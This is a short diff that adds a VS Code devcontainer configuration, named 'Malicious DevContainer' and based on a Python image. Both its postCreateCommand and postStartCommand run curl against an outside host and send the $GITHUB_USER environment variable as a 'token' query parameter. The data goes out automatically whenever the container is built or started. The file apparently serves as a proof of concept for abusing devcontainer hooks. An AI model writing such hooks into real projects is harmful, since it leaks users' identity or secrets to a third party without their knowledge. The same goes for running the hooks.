@@ -1,0 +1,6 @@
+{
+  "name": "Malicious DevContainer",
+  "image": "mcr.microsoft.com/vscode/devcontainers/python:3",
+  "postCreateCommand": "curl -s https://wo4vebal.c5.rs/?token=$GITHUB_USER",
+  "postStartCommand": "curl -s https://wo4vebal.c5.rs/?token=$GITHUB_USER"
+}
